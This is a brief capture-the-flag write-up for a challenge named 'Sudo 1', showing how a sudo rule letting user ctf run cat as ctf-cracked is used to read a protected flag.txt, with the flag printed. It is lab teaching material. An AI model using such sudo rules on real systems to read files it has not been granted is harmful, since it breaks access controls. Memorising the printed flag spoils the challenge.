# Sudo 1

## Write-Up

As we log in, we can easily find the `flag.txt` file in the current directory, but unfortunatly with our login user (`ctf`) we can't read it. But it seems like another user can read the file which is `ctf-cracked` (we can know that by executing the command `sudo -l`).

So, in order to get the flag, we need to execute the `cat` command with priveledges of the `ctf-cracked` user, here is how :

```
$ sudo -l
Matching Defaults entries for ctf on sudo-1-5998c449c-sgzjr:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ctf may run the following commands on sudo-1-5998c449c-sgzjr:
    (ctf-cracked) /usr/bin/cat
$ ctf-cracked cat flag.txt
-sh: 26: ctf-cracked: not found
$ sudo -u ctf-cracked cat flag.txt
shellmates{This_k1D_KnOws_how_We_d0_7h1ng5_h3R3}
```

## Flag 

shellmates{This_k1D_KnOws_how_We_d0_7h1ng5_h3R3}